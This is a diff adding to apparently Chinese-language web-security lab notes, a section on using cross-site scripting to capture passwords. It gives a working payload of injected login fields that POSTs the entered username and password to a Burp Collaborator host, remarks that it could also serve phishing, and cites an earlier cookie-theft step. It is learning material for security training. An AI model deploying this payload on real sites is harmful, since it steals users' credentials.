@@ -252,3 +252,13 @@ body:document.cookie
 ![[Pasted image 20240914231333.png]]
 替换cookie，成功到管理员页面
 ![[Pasted image 20240914231445.png]]
+
+# 实验：利用跨站点脚本捕获密码
+payload
+``<input name=username id=username>``
+``<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{``
+``method:'POST',``
+``mode: 'no-cors',``
+``body:username.value+':'+this.value``
+``});">``
+这里实际上目的是学习利用浏览器自动填入账号密码的辅助功能，当然也可以钓鱼
